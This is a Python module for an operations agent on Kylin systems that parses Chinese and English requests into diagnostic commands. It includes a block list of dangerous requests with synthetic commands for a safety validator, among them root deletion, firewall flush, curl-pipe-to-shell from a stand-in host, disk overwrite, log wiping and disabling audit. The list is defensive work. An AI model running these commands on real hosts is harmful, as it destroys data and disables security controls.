"""Rule-based natural-language intent parser for the OPS agent.

Phase 1 keeps this purely deterministic - no LLM calls. The parser
matches the spec's eight common OPS intents:

    * PORT_LOOKUP           - "查看 8080 端口被哪个进程占用"
    * PROCESS_LIST          - "查看进程"
    * DISK_USAGE            - "查看磁盘"
    * MEMORY_STATUS         - "查看内存"
    * CPU_LOAD              - "查看 CPU 负载"
    * SERVICE_STATUS        - "查看 nginx 服务状态"
    * RECENT_ERROR_LOGS     - "分析最近系统错误日志"
    * NETWORK_ANOMALY       - "检查异常网络连接"

Plus two utility intents:

    * RAW_COMMAND           - the user already typed a shell command
                              (handed to the executor / safety validator)
    * UNKNOWN               - nothing matched (orchestrator falls back to
                              the conservative REQUIRE_APPROVAL default)

Every intent maps to:

    candidate_commands   list of *equivalent* shell commands that the
                         safety validator can score and the executor
                         can optionally run.
    mcp_tools            list of {"tool": <method name on OsMCPClient>,
                         "params": {...}} entries the orchestrator will
                         dispatch in order.
    extracted_params     dict of typed parameters parsed from the
                         instruction (port number, service name, ...).

The catalogue is ordered from most specific to most generic; the first
rule whose regex hits wins. Patterns mix Chinese and English keywords
so the orchestrator works on both Kylin (zh-CN) and English consoles
without a separate translation step.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from re import error  # for _first_non_none_group's exception tuple
from typing import Any, Callable

# ---------------------------------------------------------------------------
# Intent IDs
# ---------------------------------------------------------------------------

INTENT_PORT_LOOKUP = "PORT_LOOKUP"
INTENT_PROCESS_LIST = "PROCESS_LIST"
INTENT_DISK_USAGE = "DISK_USAGE"
INTENT_MEMORY_STATUS = "MEMORY_STATUS"
INTENT_CPU_LOAD = "CPU_LOAD"
INTENT_SERVICE_STATUS = "SERVICE_STATUS"
INTENT_RECENT_ERROR_LOGS = "RECENT_ERROR_LOGS"
INTENT_NETWORK_ANOMALY = "NETWORK_ANOMALY"
INTENT_KYLINSEC_STATUS = "KYLINSEC_STATUS"
INTENT_TCM_VERIFY = "TCM_VERIFY"
INTENT_KERNEL_MODULE_CHECK = "KERNEL_MODULE_CHECK"
INTENT_DANGEROUS_COMMAND = "DANGEROUS_COMMAND"
INTENT_RAW_COMMAND = "RAW_COMMAND"
INTENT_UNKNOWN = "UNKNOWN"


# ---------------------------------------------------------------------------
# Dangerous-command categories (used by the safety demo / orchestrator)
# ---------------------------------------------------------------------------

DANGER_DESTRUCTIVE_ROOT = "destructive_root"
DANGER_PERMISSION_777 = "permission_777"
DANGER_FIREWALL_FLUSH = "firewall_flush"
DANGER_REMOTE_SCRIPT_EXEC = "remote_script_exec"
DANGER_FS_FORMAT = "filesystem_format"
DANGER_DISK_OVERWRITE = "disk_overwrite"
DANGER_HOST_OFFLINE = "host_offline"
DANGER_LOG_DESTRUCTION = "log_destruction"
DANGER_KYLINSEC_DISABLE = "kylinsec_disable"
DANGER_TCM_TAMPER = "tcm_tamper"
DANGER_BOOT_CHAIN_BREAK = "boot_chain_break"
DANGER_REPO_TAMPER = "repo_tamper"
DANGER_UNSIGNED_MODULE = "unsigned_module"
DANGER_IMA_POLICY_TAMPER = "ima_policy_tamper"
DANGER_AUDIT_DISABLE = "audit_disable"
DANGER_FIRMWARE_WRITE = "firmware_write"


# ---------------------------------------------------------------------------
# Result
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class IntentMatch:
    """Result of :func:`parse_instruction` (frozen, json-serializable)."""

    intent_id: str
    intent_label: str
    candidate_commands: list[str] = field(default_factory=list)
    mcp_tools: list[dict[str, Any]] = field(default_factory=list)
    extracted_params: dict[str, Any] = field(default_factory=dict)
    matched_keyword: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "intent": self.intent_id,
            "intentLabel": self.intent_label,
            "candidateCommands": list(self.candidate_commands),
            "candidateActions": [],
            "mcpTools": [dict(t) for t in self.mcp_tools],
            "extractedParams": dict(self.extracted_params),
            "matchedKeyword": self.matched_keyword,
        }


# ---------------------------------------------------------------------------
# Regex helpers
# ---------------------------------------------------------------------------


def _re(pattern: str) -> re.Pattern[str]:
    """Compile a case-insensitive regex once at import time."""
    return re.compile(pattern, re.IGNORECASE)


# Service name allowed characters (systemd unit names + .service suffix).
_SERVICE_NAME_RE = re.compile(r"[A-Za-z0-9_.\-@]+")


def _safe_service_name(raw: str) -> str | None:
    """Return ``raw`` if it looks like a valid systemd unit name, else None."""
    raw = raw.strip().strip('"').strip("'")
    if not raw:
        return None
    match = _SERVICE_NAME_RE.fullmatch(raw)
    return raw if match else None


# Patterns that strongly suggest the operator typed a raw shell command
# verbatim (rather than describing intent). The orchestrator will route
# these to the safety validator unmodified.
_RAW_COMMAND_HINTS = _re(
    r"(?:^|\s)(?:rm|chmod|chown|mkfs|dd|shutdown|reboot|halt|poweroff|"
    r"iptables|firewall-cmd|kubectl|curl|wget|kill|systemctl|journalctl|"
    r"ps|ss|netstat|lsof|df|free|uptime|cat|tail|head|grep)\b"
)


# ---------------------------------------------------------------------------
# Intent rules
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class _IntentRule:
    """Internal registration for a regex -> IntentMatch builder."""

    intent_id: str
    intent_label: str
    pattern: re.Pattern[str]
    builder: Callable[[re.Match[str], str], IntentMatch]


def _first_non_none_group(match: re.Match[str], names: tuple[str, ...]) -> str | None:
    """Return the first named group whose value is non-empty."""
    for name in names:
        try:
            value = match.group(name)
        except (IndexError, error):  # type: ignore[name-defined]
            continue
        if value:
            return value
    return None


def _port_lookup(match: re.Match[str], _text: str) -> IntentMatch:
    port = _first_non_none_group(match, ("port", "port2", "port3")) or ""
    return IntentMatch(
        intent_id=INTENT_PORT_LOOKUP,
        intent_label="查看端口占用 (port lookup)",
        candidate_commands=["ss -tunlp", "ps -ef"],
        mcp_tools=[
            {"tool": "get_network_sockets", "params": {"state": "listen"}},
            {"tool": "get_process_list", "params": {"top_n": 50}},
        ],
        extracted_params={"port": port},
        matched_keyword=f"port {port}",
    )


def _service_status(match: re.Match[str], _text: str) -> IntentMatch:
    raw = _first_non_none_group(
        match, ("service", "service2", "service3", "service4")
    ) or ""
    service = _safe_service_name(raw) or "sshd"
    return IntentMatch(
        intent_id=INTENT_SERVICE_STATUS,
        intent_label="查看服务状态 (service status)",
        candidate_commands=[f"systemctl status {service}"],
        mcp_tools=[
            {"tool": "get_service_status", "params": {"service_name": service}},
        ],
        extracted_params={"service": service},
        matched_keyword=f"service {service}",
    )


def _process_list(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_PROCESS_LIST,
        intent_label="查看进程列表 (process list)",
        candidate_commands=["ps -ef"],
        mcp_tools=[{"tool": "get_process_list", "params": {"top_n": 50}}],
        matched_keyword=match.group(0),
    )


def _disk_usage(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_DISK_USAGE,
        intent_label="查看磁盘使用 (disk usage)",
        candidate_commands=["df -h"],
        mcp_tools=[{"tool": "get_disk_usage", "params": {}}],
        matched_keyword=match.group(0),
    )


def _memory_status(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_MEMORY_STATUS,
        intent_label="查看内存状态 (memory status)",
        candidate_commands=["free -m"],
        mcp_tools=[{"tool": "get_memory_status", "params": {}}],
        matched_keyword=match.group(0),
    )


def _cpu_load(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_CPU_LOAD,
        intent_label="查看 CPU 负载 (cpu load)",
        candidate_commands=["uptime"],
        mcp_tools=[{"tool": "get_cpu_load", "params": {}}],
        matched_keyword=match.group(0),
    )


def _recent_error_logs(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_RECENT_ERROR_LOGS,
        intent_label="分析最近系统错误日志 (recent error logs)",
        candidate_commands=["journalctl -p err -n 200"],
        mcp_tools=[{"tool": "get_system_logs", "params": {"lines": 200}}],
        matched_keyword=match.group(0),
    )


def _network_anomaly(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_NETWORK_ANOMALY,
        intent_label="检查异常网络连接 (network anomaly)",
        candidate_commands=["ss -tunap"],
        mcp_tools=[
            {"tool": "get_network_sockets", "params": {"state": "all", "top_n": 500}},
            {"tool": "get_process_list", "params": {"top_n": 50}},
        ],
        matched_keyword=match.group(0),
    )


def _kylinsec_status(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_KYLINSEC_STATUS,
        intent_label="查看麒麟安全框架状态 (KylinSec status)",
        candidate_commands=["kylinsec-status"],
        mcp_tools=[
            {"tool": "get_kylinsec_status", "params": {}},
        ],
        matched_keyword=match.group(0),
    )


def _tcm_verify(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_TCM_VERIFY,
        intent_label="验证系统可信状态 (TCM attestation)",
        candidate_commands=["tcm_get_info"],
        mcp_tools=[
            {"tool": "get_tcm_pcrs", "params": {}},
            {"tool": "get_kylin_patch_level", "params": {}},
        ],
        matched_keyword=match.group(0),
    )


def _kernel_module_check(match: re.Match[str], _text: str) -> IntentMatch:
    return IntentMatch(
        intent_id=INTENT_KERNEL_MODULE_CHECK,
        intent_label="检查内核模块签名状态 (kernel module signatures)",
        candidate_commands=["lsmod"],
        mcp_tools=[
            {"tool": "get_kernel_module_signatures", "params": {}},
        ],
        matched_keyword=match.group(0),
    )


# ---------------------------------------------------------------------------
# Dangerous intent catalogue
# ---------------------------------------------------------------------------
#
# Each entry maps a (case-insensitive) regex to:
#
#   * a stable danger ``category`` (used by the orchestrator / UI)
#   * a synthetic dangerous shell command that is forwarded to the safety
#     validator. The validator's BLOCK rules will then match this command
#     and produce a CRITICAL/HIGH BLOCK envelope.
#   * a one-line label shown in the UI (Chinese + English).
#
# Patterns mix Chinese natural-language phrasings ("删除根目录所有文件",
# "把系统目录权限改成 777") and raw shell forms prefixed with the verbs
# "执行 / 运行 / run / execute" so both styles funnel into the dangerous-
# intent flow rather than RAW_COMMAND.
#
# Order is most-specific first; the first hit wins.

_DANGER_RULES: tuple[
    tuple[re.Pattern[str], str, str, str], ...
] = (
    # ---- Destructive root deletion ----
    (
        _re(
            r"(?:删除\s*根目录(?:下)?(?:所有)?(?:文件)?|清空\s*根目录|"
            r"wipe\s+(?:the\s+)?root|delete\s+(?:the\s+)?root\s+filesystem|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+rm\s+-rf\s+/(?:\s|$|\*)|"
            r"(?:^|\s)rm\s+-rf\s+/(?:\s|$|\*))"
        ),
        DANGER_DESTRUCTIVE_ROOT,
        "rm -rf /",
        "高危：删除根目录文件 (rm -rf /)",
    ),
    # ---- Recursive 777 permission grant ----
    (
        _re(
            r"(?:把.*?(?:系统|根)?\s*目录\s*权限\s*(?:改|设)?成?\s*777|"
            r"(?:系统|根).*?权限\s*777|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+chmod\s+(?:-R\s+)?777|"
            r"(?:^|\s)chmod\s+(?:-R\s+)?777\s+/)"
        ),
        DANGER_PERMISSION_777,
        "chmod -R 777 /",
        "高危：将系统目录权限设为 777 (chmod -R 777 /)",
    ),
    # ---- Firewall rule wipe ----
    (
        _re(
            r"(?:清空\s*(?:所有)?\s*防火墙(?:规则)?|"
            r"flush\s+(?:all\s+)?(?:firewall|iptables)|"
            r"reset\s+(?:firewall|iptables)|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+iptables\s+-F\b|"
            r"(?:^|\s)iptables\s+(?:-[A-Za-z]*F[A-Za-z]*|--flush)\b)"
        ),
        DANGER_FIREWALL_FLUSH,
        "iptables -F",
        "高危：清空防火墙规则 (iptables -F)",
    ),
    # ---- Remote-script pipe-to-shell ----
    (
        _re(
            r"(?:(?:下载|远程)?(?:一个)?\s*脚本\s*(?:并|然后)?\s*执行|"
            r"(?:curl|wget)\s*[^|;&]*\s*(?:脚本|script)\s*[^|;&]*\s*(?:并|然后|\|)?\s*(?:执行|sh|bash)|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+(?:curl|wget|fetch)[^|;&]*\|\s*(?:sh|bash|zsh|ksh|fish|dash)\b|"
            r"(?:^|\s)(?:curl|wget|fetch)[^|;&]*\|\s*(?:sh|bash|zsh|ksh|fish|dash)\b)"
        ),
        DANGER_REMOTE_SCRIPT_EXEC,
        "curl http://example.com/install.sh | sh",
        "高危：下载远程脚本并执行 (curl ... | sh)",
    ),
    # ---- Filesystem format ----
    (
        _re(
            r"(?:格式化\s*(?:磁盘|分区|硬盘|/dev)|"
            r"format\s+(?:the\s+)?(?:disk|partition|device)|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+mkfs(?:\.[a-z0-9]+)?\b|"
            r"(?:^|\s)mkfs(?:\.[a-z0-9]+)?\b)"
        ),
        DANGER_FS_FORMAT,
        "mkfs.ext4 /dev/sda1",
        "高危：格式化磁盘 (mkfs)",
    ),
    # ---- dd to /dev (overwrite raw device) ----
    (
        _re(
            r"(?:用\s*dd\s*(?:覆盖|写入)\s*/dev|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+dd\b[^|;&]*\bof=/dev/[a-z0-9]+|"
            r"(?:^|\s)dd\b[^|;&]*\bof=/dev/[a-z0-9]+)"
        ),
        DANGER_DISK_OVERWRITE,
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "高危：直接写入块设备 (dd of=/dev/...)",
    ),
    # ---- Host shutdown / reboot / halt / poweroff ----
    (
        _re(
            r"(?:关机|重新启动\s*主机|关闭\s*主机|"
            r"shut\s*down\s+(?:the\s+)?host|reboot\s+(?:the\s+)?host|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+(?:shutdown|reboot|halt|poweroff)\b|"
            r"(?:^|\s)(?:shutdown|halt|poweroff)\b)"
        ),
        DANGER_HOST_OFFLINE,
        "shutdown -h now",
        "高危：关闭 / 重启主机 (shutdown / reboot)",
    ),
    # ---- System log destruction ----
    (
        _re(
            r"(?:删除\s*(?:系统)?\s*日志|清空\s*(?:系统)?\s*日志|"
            r"delete\s+(?:the\s+)?system\s+logs|wipe\s+(?:the\s+)?logs|"
            r"(?:^|\s)(?:执行|运行|run|execute)\s+rm\s+-rf\s+/var/log\b|"
            r"(?:^|\s)rm\s+-rf\s+/var/log\b)"
        ),
        DANGER_LOG_DESTRUCTION,
        "rm -rf /var/log",
        "高危：删除系统日志 (rm -rf /var/log)",
    ),
    # ---- KylinSec disable ----
    (
        _re(
            r"(?:关闭\s*(?:麒麟)?\s*安全框架|禁用\s*(?:麒麟)?\s*安全框架|"
            r"disable\s+(?:kylin|KylinSec|kylinsec)|"
            r"turn\s+off\s+KylinSec|"
            r"kylinsec\s+(?:set\s+mode\s+(?:disabled|permissive)|disable|off|stop))"
        ),
        DANGER_KYLINSEC_DISABLE,
        "kylinsec set mode disabled",
        "高危：禁用麒麟安全框架 (kylinsec disable)",
    ),
    # ---- TCM tamper ----
    (
        _re(
            r"(?:清除\s*TCM|重置\s*TCM|清空\s*PCR|"
            r"(?:reset|clear|wipe)\s+(?:the\s+)?(?:TCM|PCR)|"
            r"tcm(?:ctl|_info|_set|r)\w*\s+(?:reset|clear|wipe))"
        ),
        DANGER_TCM_TAMPER,
        "tcmctl reset pcr",
        "高危：重置TCM可信模块 (TCM PCR reset)",
    ),
    # ---- Boot chain tamper ----
    (
        _re(
            r"(?:删除\s*(?:启动|引导)\s*(?:项|条目)|破坏\s*(?:启动|引导)|"
            r"efibootmgr\s+.*?(?:delete|remove)|"
            r"grub.*?(?:delete|remove|--force))"
        ),
        DANGER_BOOT_CHAIN_BREAK,
        "efibootmgr --delete-bootnum 0000",
        "高危：破坏可信启动链 (efibootmgr delete)",
    ),
    # ---- Kylin repo tamper ----
    (
        _re(
            r"(?:删除\s*麒麟\s*(?:软件)?源|移除\s*麒麟\s*(?:yum|dnf)\s*源|"
            r"rm\s+-rf\s+/etc/yum\.repos\.d/(?:kylin|Kylin))"
        ),
        DANGER_REPO_TAMPER,
        "rm /etc/yum.repos.d/kylin.repo",
        "高危：删除麒麟软件源 (rm kylin.repo)",
    ),
    # ---- Unsigned kernel module ----
    (
        _re(
            r"(?:强制加载\s*(?:内核)?\s*模块|"
            r"modprobe\s+--force|insmod\s+--force|"
            r"加载\s*未签名\s*(?:内核)?\s*模块)"
        ),
        DANGER_UNSIGNED_MODULE,
        "modprobe --force evil.ko",
        "高危：强制加载未签名内核模块 (modprobe --force)",
    ),
    # ---- Disable kernel audit ----
    (
        _re(
            r"(?:关闭\s*(?:内核)?\s*审计|禁用\s*(?:内核)?\s*审计|"
            r"auditctl\s+(?:-e\s+0|--reset)|"
            r"disable\s+(?:kernel\s+)?audit)"
        ),
        DANGER_AUDIT_DISABLE,
        "auditctl -e 0",
        "高危：禁用内核审计子系统 (auditctl -e 0)",
    ),
    # ---- LoongArch firmware write ----
    (
        _re(
            r"(?:写入\s*(?:LoongArch|龙芯)?\s*固件|刷写\s*(?:BIOS|固件|flash)|"
            r"flashrom\s+--write|loongson-efi\s+write)"
        ),
        DANGER_FIRMWARE_WRITE,
        "flashrom --write evil.bin",
        "高危：写入LoongArch固件 (flashrom write)",
    ),
)


def _dangerous_command_match(text: str) -> tuple[str, str, str] | None:
    """Return ``(category, synthetic_command, label)`` if any rule hits."""
    for pattern, category, command, label in _DANGER_RULES:
        if pattern.search(text):
            return category, command, label
    return None


def _build_dangerous_intent(
    category: str, command: str, label: str
) -> IntentMatch:
    """Materialize an :class:`IntentMatch` for a recognized dangerous request."""
    return IntentMatch(
        intent_id=INTENT_DANGEROUS_COMMAND,
        intent_label=label,
        # Forward the synthetic command so the safety validator can BLOCK it.
        candidate_commands=[command],
        # No MCP context needed - we will not perform any read either.
        mcp_tools=[],
        extracted_params={
            "category": category,
            "syntheticCommand": command,
        },
        matched_keyword=category,
    )


# Catalogue order matters: more specific rules first. Service-status
# parses out an explicit unit name and must come before the generic
# "process list" rule (which would otherwise swallow "查看 nginx 进程").
_RULES: tuple[_IntentRule, ...] = (
    # PORT_LOOKUP - matches "8080 端口", "port 8080", "占用 8080".
    _IntentRule(
        intent_id=INTENT_PORT_LOOKUP,
        intent_label="查看端口占用",
        pattern=_re(
            r"(?:(?P<port>\b\d{2,5}\b)\s*(?:号)?\s*端口|"
            r"端口\s*(?P<port2>\b\d{2,5}\b)|"
            r"\bport\s*(?P<port3>\d{2,5})\b)"
        ),
        builder=_port_lookup,
    ),
    # SERVICE_STATUS - matches "查看 nginx 服务", "service status nginx".
    _IntentRule(
        intent_id=INTENT_SERVICE_STATUS,
        intent_label="查看服务状态",
        pattern=_re(
            r"(?:服务\s*(?P<service>[A-Za-z0-9_.\-@]+)\s*(?:状态|是否运行|是否启动|启动情况)|"
            r"(?P<service2>[A-Za-z0-9_.\-@]+)\s*服务\s*(?:状态|是否运行|是否启动|启动情况)|"
            r"\b(?:service|systemctl)\s+status\s+(?P<service3>[A-Za-z0-9_.\-@]+)|"
            r"\bstatus\s+of\s+(?P<service4>[A-Za-z0-9_.\-@]+)\s+service)"
        ),
        builder=_service_status,
    ),
    # RECENT_ERROR_LOGS - "最近错误日志", "recent errors", etc.
    _IntentRule(
        intent_id=INTENT_RECENT_ERROR_LOGS,
        intent_label="分析最近系统错误日志",
        pattern=_re(
            r"(?:错误日志|异常日志|故障日志|系统报错|recent\s+error|error\s+logs?|"
            r"最近.*?(?:错误|异常|报错)|分析.*?日志)"
        ),
        builder=_recent_error_logs,
    ),
    # NETWORK_ANOMALY - "异常网络", "可疑连接", etc.
    _IntentRule(
        intent_id=INTENT_NETWORK_ANOMALY,
        intent_label="检查异常网络连接",
        pattern=_re(
            r"(?:异常网络|异常连接|可疑连接|外联|外部连接|对外连接|"
            r"网络异常|网络连接.*?(?:异常|可疑)|"
            r"suspicious\s+(?:network|connection|traffic)|"
            r"check.*?network.*?(?:anomaly|connection))"
        ),
        builder=_network_anomaly,
    ),
    # KYLINSEC_STATUS - "麒麟安全框架", "KylinSec", etc.
    _IntentRule(
        intent_id=INTENT_KYLINSEC_STATUS,
        intent_label="查看麒麟安全框架状态",
        pattern=_re(
            r"(?:麒麟安全(?:框架|策略)?|KylinSec|"
            r"强制访问(?:控制)?\s*(?:状态|模式|情况)|"
            r"MAC\s*(?:状态|模式|status))"
        ),
        builder=_kylinsec_status,
    ),
    # TCM_VERIFY - "可信计算", "TCM", "远程证明", etc.
    _IntentRule(
        intent_id=INTENT_TCM_VERIFY,
        intent_label="验证系统可信状态",
        pattern=_re(
            r"(?:可信(?:计算|状态|度量|验证|启动)?|"
            r"TCM|PCR|远程证明|remote\s+attestation|"
            r"系统可信(?:状态|度量)?)"
        ),
        builder=_tcm_verify,
    ),
    # KERNEL_MODULE_CHECK - "内核模块签名", "驱动签名", etc.
    _IntentRule(
        intent_id=INTENT_KERNEL_MODULE_CHECK,
        intent_label="检查内核模块签名状态",
        pattern=_re(
            r"(?:内核模块(?:签名|验证)?|"
            r"kernel\s+module\s+(?:sign|signature|verif)|"
            r"模块签名|驱动签名)"
        ),
        builder=_kernel_module_check,
    ),
    # DISK_USAGE - "磁盘", "硬盘", "df", etc.
    _IntentRule(
        intent_id=INTENT_DISK_USAGE,
        intent_label="查看磁盘使用",
        pattern=_re(
            r"(?:磁盘(?:使用|占用|空间|情况)?|硬盘(?:使用|占用|空间|情况)?|"
            r"\bdisk\s+(?:usage|space|util)|\bdf\b)"
        ),
        builder=_disk_usage,
    ),
    # MEMORY_STATUS - "内存", "memory", etc.
    _IntentRule(
        intent_id=INTENT_MEMORY_STATUS,
        intent_label="查看内存状态",
        pattern=_re(
            r"(?:内存(?:使用|占用|情况|状态)?|"
            r"\bmemory\s+(?:usage|status|util)|\bfree\b)"
        ),
        builder=_memory_status,
    ),
    # CPU_LOAD - "cpu", "负载", "load average", etc.
    _IntentRule(
        intent_id=INTENT_CPU_LOAD,
        intent_label="查看 CPU 负载",
        pattern=_re(
            r"(?:cpu\s*(?:负载|占用|使用|情况|load|usage|util)|"
            r"系统负载|load\s+average|\buptime\b)"
        ),
        builder=_cpu_load,
    ),
    # PROCESS_LIST - generic "进程", "process", "ps". Last to avoid stealing
    # more specific intents like SERVICE_STATUS or PORT_LOOKUP.
    _IntentRule(
        intent_id=INTENT_PROCESS_LIST,
        intent_label="查看进程列表",
        pattern=_re(
            r"(?:进程(?:列表|信息|情况)?|process\s+list|\bps\s+aux\b|\bps\s+-ef\b)"
        ),
        builder=_process_list,
    ),
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def parse_instruction(instruction: str) -> IntentMatch:
    """Parse an operator instruction into an :class:`IntentMatch`.

    Resolution order:

    1. ``INTENT_DANGEROUS_COMMAND`` - matches dangerous NL phrasings AND
       raw shell forms of the seven blacklist scenarios. Always wins so
       the orchestrator can short-circuit straight to the safety gate.
    2. The eight safe-intent rules in ``_RULES``.
    3. ``INTENT_RAW_COMMAND`` if the input still looks like a verbatim
       shell command (recognized program name).
    4. ``INTENT_UNKNOWN`` otherwise.
    """
    text = (instruction or "").strip()
    if not text:
        return IntentMatch(
            intent_id=INTENT_UNKNOWN,
            intent_label="未识别意图 (empty input)",
        )

    # 1) Dangerous-intent rules win unconditionally so we never
    # accidentally treat "执行 rm -rf /" as a generic raw command.
    danger = _dangerous_command_match(text)
    if danger:
        category, command, label = danger
        return _build_dangerous_intent(category, command, label)

    # 2) Safe intent catalogue.
    for rule in _RULES:
        match = rule.pattern.search(text)
        if match:
            return rule.builder(match, text)

    # 3) RAW_COMMAND fallback for anything that still smells like a
    # shell invocation (e.g. "kill -9 1234"). Forwarded verbatim to the
    # safety validator.
    if _RAW_COMMAND_HINTS.search(text):
        return IntentMatch(
            intent_id=INTENT_RAW_COMMAND,
            intent_label="原始命令 (raw shell command)",
            candidate_commands=[text],
            matched_keyword="raw-shell-hint",
        )

    return IntentMatch(
        intent_id=INTENT_UNKNOWN,
        intent_label="未识别意图 (unknown)",
    )


__all__ = [
    "INTENT_PORT_LOOKUP",
    "INTENT_PROCESS_LIST",
    "INTENT_DISK_USAGE",
    "INTENT_MEMORY_STATUS",
    "INTENT_CPU_LOAD",
    "INTENT_SERVICE_STATUS",
    "INTENT_RECENT_ERROR_LOGS",
    "INTENT_NETWORK_ANOMALY",
    "INTENT_KYLINSEC_STATUS",
    "INTENT_TCM_VERIFY",
    "INTENT_KERNEL_MODULE_CHECK",
    "INTENT_DANGEROUS_COMMAND",
    "INTENT_RAW_COMMAND",
    "INTENT_UNKNOWN",
    "DANGER_DESTRUCTIVE_ROOT",
    "DANGER_PERMISSION_777",
    "DANGER_FIREWALL_FLUSH",
    "DANGER_REMOTE_SCRIPT_EXEC",
    "DANGER_FS_FORMAT",
    "DANGER_DISK_OVERWRITE",
    "DANGER_HOST_OFFLINE",
    "DANGER_LOG_DESTRUCTION",
    "DANGER_KYLINSEC_DISABLE",
    "DANGER_TCM_TAMPER",
    "DANGER_BOOT_CHAIN_BREAK",
    "DANGER_REPO_TAMPER",
    "DANGER_UNSIGNED_MODULE",
    "DANGER_IMA_POLICY_TAMPER",
    "DANGER_AUDIT_DISABLE",
    "DANGER_FIRMWARE_WRITE",
    "IntentMatch",
    "parse_instruction",
]
